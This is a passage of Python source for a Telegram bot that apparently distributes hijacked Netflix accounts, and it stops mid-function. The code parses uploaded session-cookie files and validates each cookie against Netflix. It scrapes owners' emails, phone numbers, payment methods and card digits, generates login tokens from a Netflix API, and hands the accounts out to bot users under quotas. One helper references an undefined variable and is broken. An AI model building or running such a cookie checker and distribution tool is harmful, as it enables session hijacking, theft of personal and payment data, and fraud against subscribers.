import sys
import asyncio
import json
import os
import re
import random
import string
import time
import ssl
import sqlite3
import threading
import zipfile
import shutil
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

import requests
import urllib3

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fix asyncio loop
try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# Try libsql
HAS_LIBSQL = False
try:
    import libsql_experimental as libsql
    HAS_LIBSQL = True
except ImportError:
    try:
        import libsql
        HAS_LIBSQL = True
    except ImportError:
        pass

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember, InputFile
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
WEB_PORT = int(os.getenv("PORT", 8080))
WEB_HOST = os.getenv("WEB_HOST", "0.0.0.0")

admin_ids_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(aid.strip()) for aid in admin_ids_str.split(",") if aid.strip().isdigit()]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

# ============================================================
# DATABASE CLASS
# ============================================================
class Database:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.use_turso = HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://")
        try:
            if self.use_turso:
                self.conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                logger.info(f"✅ Connected to Turso database")
            else:
                self.conn = sqlite3.connect("bot.db", check_same_thread=False)
                logger.info(f"✅ Connected to local SQLite database")
            self._init_tables()
        except Exception as e:
            logger.warning(f"⚠️ Turso init failed ({e}). Falling back to SQLite.")
            self.conn = sqlite3.connect("bot.db", check_same_thread=False)
            self._init_tables()
    
    def _init_tables(self):
        cur = self.conn.cursor()
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_banned BOOLEAN DEFAULT 0,
                is_admin BOOLEAN DEFAULT 0,
                last_account_time TIMESTAMP,
                total_working INT DEFAULT 0,
                total_notworking INT DEFAULT 0,
                working_reports INT DEFAULT 0,
                notworking_reports INT DEFAULT 0,
                accounts_used INT DEFAULT 0,
                pending_report BOOLEAN DEFAULT 0,
                pending_report_account_id INTEGER,
                pending_report_type TEXT
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT,
                country TEXT,
                plan TEXT,
                cookies TEXT,
                nftoken TEXT,
                nftoken_expiry TEXT,
                assigned_to INTEGER,
                assigned_at TIMESTAMP,
                is_working BOOLEAN DEFAULT 1,
                status TEXT DEFAULT 'available',
                source_file TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_checked TIMESTAMP,
                report_count INT DEFAULT 0,
                account_name TEXT,
                streams INT,
                quality TEXT,
                price TEXT,
                billing_date TEXT,
                member_since TEXT,
                payment_method TEXT,
                card_last4 TEXT,
                phone TEXT,
                extra_member BOOLEAN DEFAULT 0,
                membership_status TEXT,
                email_verified BOOLEAN DEFAULT 0,
                profiles TEXT,
                user_guid TEXT
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                account_id INTEGER,
                report_type TEXT,
                screenshot_file_id TEXT,
                status TEXT DEFAULT 'pending',
                reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reviewed_at TIMESTAMP,
                admin_note TEXT,
                admin_id INTEGER
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                message TEXT,
                admin_reply TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                replied_at TIMESTAMP
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE,
                channel_name TEXT,
                invite_link TEXT,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stock_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                file_name TEXT,
                total_found INT,
                valid_found INT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE UNIQUE,
                total_hits INT DEFAULT 0,
                total_free INT DEFAULT 0,
                total_bad INT DEFAULT 0
            )
        ''')
        
        self.conn.commit()
    
    def execute(self, query, params=None):
        cur = self.conn.cursor()
        if params:
            cur.execute(query, params)
        else:
            cur.execute(query)
        return cur
    
    def executemany(self, query, params_list):
        cur = self.conn.cursor()
        cur.executemany(query, params_list)
        return cur
    
    def commit(self):
        self.conn.commit()
    
    def close(self):
        self.conn.close()

db = Database()

# ============================================================
# DATABASE HELPERS
# ============================================================

def get_user(user_id: int) -> Optional[Dict]:
    cur = db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    row = cur.fetchone()
    if row:
        return {
            "user_id": row[0], "username": row[1], "first_name": row[2],
            "joined_at": row[3], "is_banned": row[4], "is_admin": row[5],
            "last_account_time": row[6], "total_working": row[7],
            "total_notworking": row[8], "working_reports": row[9],
            "notworking_reports": row[10], "accounts_used": row[11],
            "pending_report": row[12], "pending_report_account_id": row[13],
            "pending_report_type": row[14],
        }
    return None

def get_all_users() -> List[Dict]:
    cur = db.execute('SELECT user_id, username, first_name, joined_at, is_banned, is_admin FROM users ORDER BY joined_at DESC')
    rows = cur.fetchall()
    return [{"user_id": r[0], "username": r[1], "first_name": r[2], "joined_at": r[3], "is_banned": r[4], "is_admin": r[5]} for r in rows]

def get_user_count() -> int:
    cur = db.execute('SELECT COUNT(*) FROM users')
    return cur.fetchone()[0]

def create_user(user_id: int, username: str, first_name: str):
    is_admin = 1 if user_id in ADMIN_IDS else 0
    db.execute('''
        INSERT OR IGNORE INTO users (user_id, username, first_name, is_admin, pending_report)
        VALUES (?, ?, ?, ?, 0)
    ''', (user_id, username or "", first_name or "", is_admin))
    db.commit()

def update_user_username(user_id: int, username: str):
    db.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    db.commit()

def set_pending_report(user_id: int, account_id: int, report_type: str):
    db.execute('''
        UPDATE users 
        SET pending_report = 1, pending_report_account_id = ?, pending_report_type = ?
        WHERE user_id = ?
    ''', (account_id, report_type, user_id))
    db.commit()

def clear_pending_report(user_id: int):
    db.execute('''
        UPDATE users 
        SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
        WHERE user_id = ?
    ''', (user_id,))
    db.commit()

def has_pending_report(user_id: int) -> bool:
    user = get_user(user_id)
    return user and user.get("pending_report", 0) == 1

def get_pending_report_data(user_id: int) -> Optional[Dict]:
    user = get_user(user_id)
    if user and user.get("pending_report"):
        return {
            "account_id": user.get("pending_report_account_id"),
            "report_type": user.get("pending_report_type"),
        }
    return None

def ban_user(user_id: int, admin_id: int):
    db.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
    db.commit()

def unban_user(user_id: int):
    db.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
    db.commit()

def get_available_accounts() -> List[Dict]:
    cur = db.execute('''
        SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
               account_name, streams, quality, price, billing_date, member_since,
               payment_method, card_last4, phone, extra_member, profiles, user_guid
        FROM accounts WHERE status = 'available' AND is_working = 1 ORDER BY id ASC
    ''')
    rows = cur.fetchall()
    return [
        {
            "id": r[0], "email": r[1], "country": r[2], "plan": r[3],
            "cookies": r[4], "nftoken": r[5], "nftoken_expiry": r[6],
            "status": r[7], "account_name": r[8], "streams": r[9],
            "quality": r[10], "price": r[11], "billing_date": r[12],
            "member_since": r[13], "payment_method": r[14],
            "card_last4": r[15], "phone": r[16], "extra_member": r[17],
            "profiles": r[18], "user_guid": r[19],
        }
        for r in rows
    ]

def get_total_accounts() -> Dict:
    cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
    total = cur.fetchone()[0]
    cur = db.execute('SELECT plan, COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1 GROUP BY plan')
    plan_counts = {r[0]: r[1] for r in cur.fetchall()}
    return {"total": total, "plans": plan_counts}

def get_dashboard_stats() -> Dict:
    cur = db.execute('SELECT COUNT(*) FROM users')
    total_users = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM users WHERE is_banned = 0')
    active_users = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
    available = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM accounts WHERE is_working = 1')
    total_working = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "assigned"')
    assigned = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM reports WHERE status = "pending"')
    pending_reports = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM reports WHERE status = "accepted"')
    accepted_reports = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM reports WHERE status = "rejected"')
    rejected_reports = cur.fetchone()[0]
    
    cur = db.execute('SELECT COUNT(*) FROM messages WHERE status = "pending"')
    pending_messages = cur.fetchone()[0]
    
    cur = db.execute('SELECT plan, COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1 GROUP BY plan')
    plan_counts = {r[0]: r[1] for r in cur.fetchall()}
    
    cur = db.execute('''
        SELECT date, total_hits, total_free, total_bad 
        FROM stats 
        ORDER BY date DESC 
        LIMIT 7
    ''')
    recent_stats = [{"date": r[0], "hits": r[1], "free": r[2], "bad": r[3]} for r in cur.fetchall()]
    
    return {
        "total_users": total_users,
        "active_users": active_users,
        "available": available,
        "total_working": total_working,
        "assigned": assigned,
        "pending_reports": pending_reports,
        "accepted_reports": accepted_reports,
        "rejected_reports": rejected_reports,
        "pending_messages": pending_messages,
        "plan_counts": plan_counts,
        "recent_stats": recent_stats,
    }

def assign_account(user_id: int, account_id: int) -> bool:
    db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE assigned_to = ?', (user_id,))
    cur = db.execute('''
        UPDATE accounts 
        SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
        WHERE id = ? AND status = 'available'
    ''', (user_id, account_id))
    if cur.rowcount > 0:
        db.execute('''
            UPDATE users 
            SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
            WHERE user_id = ?
        ''', (user_id,))
        db.commit()
        return True
    db.commit()
    return False

def get_assigned_account(user_id: int) -> Optional[Dict]:
    cur = db.execute('''
        SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
               account_name, streams, quality, price, billing_date, member_since,
               payment_method, card_last4, phone, extra_member, profiles, user_guid
        FROM accounts WHERE assigned_to = ? AND status = 'assigned' ORDER BY assigned_at DESC LIMIT 1
    ''', (user_id,))
    row = cur.fetchone()
    if row:
        return {
            "id": r[0], "email": r[1], "country": r[2], "plan": r[3],
            "cookies": r[4], "nftoken": r[5], "nftoken_expiry": r[6],
            "account_name": r[7], "streams": r[8], "quality": r[9],
            "price": r[10], "billing_date": r[11], "member_since": r[12],
            "payment_method": r[13], "card_last4": r[14], "phone": r[15],
            "extra_member": r[16], "profiles": r[17], "user_guid": r[18],
        }
    return None

def release_account(account_id: int):
    db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
    db.commit()

def can_get_account(user_id: int) -> Tuple[bool, str]:
    user = get_user(user_id)
    if not user:
        return True, ""
    if user["is_banned"]:
        return False, "🚫 You are banned from using this bot."
    
    last_time = user.get("last_account_time")
    if last_time:
        try:
            last_dt = datetime.strptime(str(last_time), "%Y-%m-%d %H:%M:%S")
            diff = datetime.utcnow() - last_dt
            cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
            if diff.total_seconds() < cooldown_seconds:
                remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                return False, f"⏳ Please wait {remaining} minute(s)."
        except:
            pass
    
    if user["accounts_used"] >= MAX_ACCOUNTS_PER_USER:
        return False, f"⚠️ Max {MAX_ACCOUNTS_PER_USER} accounts per user."
    return True, ""

def save_account_batch(accounts: List[Dict]) -> int:
    if not accounts:
        return 0
    query = '''
        INSERT INTO accounts (
            email, country, plan, cookies, nftoken, nftoken_expiry,
            source_file, last_checked, account_name, streams, quality,
            price, billing_date, member_since, payment_method, card_last4,
            phone, extra_member, membership_status, email_verified,
            profiles, user_guid
        ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    '''
    params_list = [
        (
            a.get("email"), a.get("country"), a.get("plan"),
            a.get("cookies"), a.get("nftoken"), a.get("nftoken_expiry"),
            a.get("source_file"), a.get("account_name"), a.get("streams"),
            a.get("quality"), a.get("price"), a.get("billing_date"),
            a.get("member_since"), a.get("payment_method"), a.get("card_last4"),
            a.get("phone"), 1 if a.get("extra_member") else 0,
            a.get("membership_status"), 1 if a.get("email_verified") else 0,
            a.get("profiles"), a.get("user_guid"),
        )
        for a in accounts
    ]
    cur = db.executemany(query, params_list)
    db.commit()
    return cur.rowcount

def create_report(user_id: int, account_id: int, report_type: str, screenshot_file_id: str) -> int:
    cur = db.execute('''
        INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
        VALUES (?, ?, ?, ?)
    ''', (user_id, account_id, report_type, screenshot_file_id))
    report_id = cur.lastrowid
    if report_type == "working":
        db.execute('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
        db.execute('UPDATE accounts SET is_working = 1, status = "available", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
    else:
        db.execute('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
        db.execute('UPDATE accounts SET is_working = 0, status = "broken", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
    db.commit()
    return report_id

def review_report(report_id: int, status: str, admin_id: int, admin_note: str = ""):
    db.execute('''
        UPDATE reports 
        SET status = ?, reviewed_at = CURRENT_TIMESTAMP, admin_note = ?, admin_id = ?
        WHERE id = ?
    ''', (status, admin_note, admin_id, report_id))
    db.commit()

def get_pending_reports() -> List[Dict]:
    cur = db.execute('''
        SELECT r.id, r.user_id, r.account_id, r.report_type, r.screenshot_file_id,
               r.status, r.reported_at, u.username, a.email, a.plan
        FROM reports r 
        JOIN users u ON r.user_id = u.user_id
        JOIN accounts a ON r.account_id = a.id
        WHERE r.status = 'pending'
        ORDER BY r.reported_at ASC
    ''')
    rows = cur.fetchall()
    return [{"id": r[0], "user_id": r[1], "account_id": r[2], "report_type": r[3], "screenshot": r[4], "status": r[5], "reported_at": r[6], "username": r[7], "email": r[8], "plan": r[9]} for r in rows]

def create_message(user_id: int, message: str) -> int:
    cur = db.execute('INSERT INTO messages (user_id, message) VALUES (?, ?)', (user_id, message))
    msg_id = cur.lastrowid
    db.commit()
    return msg_id

def get_pending_messages() -> List[Dict]:
    cur = db.execute('SELECT id, user_id, message, created_at, status FROM messages WHERE status = "pending" ORDER BY created_at ASC')
    rows = cur.fetchall()
    return [{"id": r[0], "user_id": r[1], "message": r[2], "created_at": r[3], "status": r[4]} for r in rows]

def reply_to_message(msg_id: int, reply_text: str):
    db.execute('UPDATE messages SET admin_reply = ?, status = "replied", replied_at = CURRENT_TIMESTAMP WHERE id = ?', (reply_text, msg_id))
    db.commit()

def get_message_sender(msg_id: int) -> Optional[int]:
    cur = db.execute('SELECT user_id FROM messages WHERE id = ?', (msg_id,))
    row = cur.fetchone()
    return row[0] if row else None

def get_channels() -> List[Dict]:
    cur = db.execute('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
    rows = cur.fetchall()
    return [{"id": r[0], "channel_id": r[1], "channel_name": r[2], "invite_link": r[3], "is_active": r[4]} for r in rows]

def add_channel(channel_id: str, channel_name: str, invite_link: str):
    db.execute('INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link, is_active) VALUES (?, ?, ?, 1)', (channel_id, channel_name, invite_link))
    db.commit()

def remove_channel(channel_id: str):
    db.execute('DELETE FROM channels WHERE channel_id = ?', (channel_id,))
    db.commit()

def get_reports_by_user(user_id: int) -> List[Dict]:
    cur = db.execute('SELECT id, report_type, status, reported_at, admin_note FROM reports WHERE user_id = ? ORDER BY reported_at DESC LIMIT 10', (user_id,))
    rows = cur.fetchall()
    return [{"id": r[0], "type": r[1], "status": r[2], "reported_at": r[3], "admin_note": r[4] or ""} for r in rows]

def get_account_history(user_id: int) -> List[Dict]:
    cur = db.execute('SELECT email, plan, assigned_at, status FROM accounts WHERE assigned_to = ? ORDER BY assigned_at DESC LIMIT 5', (user_id,))
    rows = cur.fetchall()
    return [{"email": r[0], "plan": r[1], "assigned_at": r[2], "status": r[3]} for r in rows]

def get_stock_logs() -> List[Dict]:
    cur = db.execute('SELECT id, admin_id, file_name, total_found, valid_found, uploaded_at FROM stock_logs ORDER BY uploaded_at DESC LIMIT 20')
    rows = cur.fetchall()
    return [{"id": r[0], "admin_id": r[1], "file_name": r[2], "total_found": r[3], "valid_found": r[4], "uploaded_at": r[5]} for r in rows]

def log_stock(admin_id: int, file_name: str, total: int, valid: int):
    db.execute('INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) VALUES (?, ?, ?, ?)', (admin_id, file_name, total, valid))
    db.commit()

def log_daily_stats(hits: int = 0, free: int = 0, bad: int = 0):
    try:
        cur = db.execute('SELECT id FROM stats WHERE date = CURRENT_DATE')
        row = cur.fetchone()
        
        if row:
            db.execute('''
                UPDATE stats 
                SET total_hits = total_hits + ?, 
                    total_free = total_free + ?, 
                    total_bad = total_bad + ?
                WHERE date = CURRENT_DATE
            ''', (hits, free, bad))
        else:
            db.execute('''
                INSERT INTO stats (date, total_hits, total_free, total_bad)
                VALUES (CURRENT_DATE, ?, ?, ?)
            ''', (hits, free, bad))
        
        db.commit()
    except Exception as e:
        pass

# ============================================================
# NFToken Generator - IMPROVED WITH RETRY
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "accept-language": "en-US;q=1",
}

def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
    """Generate NFToken with retry logic for ALL accounts."""
    if not netflix_id:
        return None, None
    
    for attempt in range(attempts):
        try:
            headers = dict(NFTOKEN_HEADERS)
            headers["Cookie"] = f"NetflixId={netflix_id}"
            headers["x-netflix.request.attempt"] = str(attempt + 1)
            
            response = requests.get(
                NFTOKEN_API_URL,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = token_data.get("token")
                expires = token_data.get("expires")
                if token:
                    return token, expires
            
            time.sleep(0.5)
            
        except Exception as e:
            logger.warning(f"NFToken attempt {attempt + 1} failed: {e}")
            time.sleep(0.5)
    
    return None, None

# ============================================================
# COOKIE EXTRACTION & ACCOUNT CHECKING
# ============================================================

def extract_all_cookie_pairs(content: str) -> List[Tuple[str, Optional[str]]]:
    pairs = []
    seen = set()
    
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            if "cookies" in data and isinstance(data["cookies"], list):
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        nid = str(cookie.get("value", "")).strip()
                        if nid and nid not in seen:
                            sid = None
                            for c in data["cookies"]:
                                if c.get("name") == "SecureNetflixId":
                                    sid = str(c.get("value", "")).strip()
                                    break
                            seen.add(nid)
                            pairs.append((nid, sid))
            elif data.get("NetflixId") or data.get("netflix_id"):
                nid = str(data.get("NetflixId") or data.get("netflix_id", "")).strip()
                sid = str(data.get("SecureNetflixId") or data.get("secure_netflix_id") or "").strip()
                if nid and nid not in seen:
                    seen.add(nid)
                    pairs.append((nid, sid if sid else None))
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    nid = str(item.get("NetflixId") or item.get("netflix_id") or "").strip()
                    sid = str(item.get("SecureNetflixId") or item.get("secure_netflix_id") or "").strip()
                    if nid and nid not in seen:
                        seen.add(nid)
                        pairs.append((nid, sid if sid else None))
    except:
        pass
    
    if not pairs:
        lines = content.splitlines()
        current_pair = {}
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                name = parts[5].strip()
                value = parts[6].strip()
                if name == "NetflixId" and value:
                    current_pair["NetflixId"] = value
                elif name == "SecureNetflixId" and value:
                    current_pair["SecureNetflixId"] = value
                if "NetflixId" in current_pair:
                    nid = current_pair.get("NetflixId")
                    sid = current_pair.get("SecureNetflixId")
                    if nid and nid not in seen:
                        seen.add(nid)
                        pairs.append((nid, sid))
                    current_pair = {}
    
    if not pairs:
        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
        netflix_matches = netflix_pattern.findall(content)
        secure_matches = secure_pattern.findall(content)
        for i, nid in enumerate(netflix_matches):
            nid = nid.strip('"\'')
            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
            if nid and nid not in seen:
                seen.add(nid)
                pairs.append((nid, sid))
    
    return pairs

def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + netflix_id]
    if secure_id:
        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + secure_id)
    return "\n".join(lines)

def check_account_full(cookies_dict: Dict) -> Dict:
    if not cookies_dict or "NetflixId" not in cookies_dict:
        return {"valid": False, "error": "Missing NetflixId"}
    
    session = requests.Session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value, domain=".netflix.com")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
    }
    
    for attempt in range(MAX_RETRIES):
        try:
            response = session.get(
                "https://www.netflix.com/account/membership",
                headers=headers,
                timeout=CHECK_TIMEOUT,
                verify=False,
                allow_redirects=True
            )
            
            if response.status_code != 200:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(0.5)
                    continue
                return {"valid": False, "error": f"HTTP {response.status_code}"}
            
            if "login" in response.url.lower() or "signin" in response.url.lower():
                return {"valid": False, "error": "Redirected to login"}
            
            text = response.text
            
            is_on_hold = (
                '"isUserOnHold":true' in text or
                '"holdStatus":true' in text or
                '"pastDue":true' in text
            )
            
            email = None
            for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    email = match.group(1).strip()
                    break
            if not email:
                match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
                if match:
                    email = match.group(1).strip()
            
            name = None
            for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    name = match.group(1).strip()
                    break
            
            country = None
            for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    country = match.group(1).strip()
                    break
            
            plan = None
            for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    plan = match.group(1).strip()
                    break            
            plan_key = "FREE"
            plan_label = "Free"
            if plan:
                plan_lower = plan.lower()
                if any(x in plan_lower for x in ["premium", "高級", "高级"]):
                    plan_key, plan_label = "PREMIUM", "Premium"
                elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
                    plan_key, plan_label = "STANDARD", "Standard"
                elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
                    plan_key, plan_label = "BASIC", "Basic"
                elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
                    plan_key, plan_label = "MOBILE", "Mobile"
                elif any(x in plan_lower for x in ["with ads", "con anuncios"]):
                    plan_key, plan_label = "STANDARD_WITH_ADS", "Standard With Ads"
            
            streams = None
            match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
            if match:
                streams = int(match.group(1))
            
            quality = None
            for pattern in [r'"videoQuality"\s*:\s*"([^"]+)"', r'"quality"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    quality = match.group(1).strip()
                    break
            
            price = None
            for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    price = match.group(1).strip()
                    break
            
            billing = None
            for pattern in [r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"nextBilling"[^}]*"value"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    billing = match.group(1).strip()
                    break
            
            member_since = None
            match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
            if match:
                member_since = match.group(1).strip()
            
            payment_method = None
            for pattern in [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentMethod"[^}]*"value"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    payment_method = match.group(1).strip()
                    break
            
            card_last4 = None
            match = re.search(r'"displayText"\s*:\s*"([^"]+)"', text)
            if match:
                val = match.group(1).strip()
                if re.fullmatch(r'\d{4}', val) or re.search(r'\d{4}$', val):
                    card_last4 = val
            
            phone = None
            for pattern in [r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', r'"phoneNumber"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    phone = match.group(1).strip()
                    break
            
            extra_member = False
            for pattern in [r'"showExtraMemberSection"\s*:\s*(true|false)', r'"showExtraMemberSection"[^}]*"value"\s*:\s*(true|false)']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    extra_member = match.group(1).lower() == "true"
                    break
            
            membership_status = None
            match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
            if match:
                membership_status = match.group(1).strip()
            
            email_verified = False
            for pattern in [r'"emailVerified"\s*:\s*(true|false)', r'"isEmailVerified"\s*:\s*(true|false)']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    email_verified = match.group(1).lower() == "true"
                    break
            
            profiles = []
            for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
                if match.group(1) not in profiles:
                    profiles.append(match.group(1))
            profiles_str = ", ".join(profiles) if profiles else None
            
            user_guid = None
            for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    user_guid = match.group(1).strip()
                    break
            
            is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
            
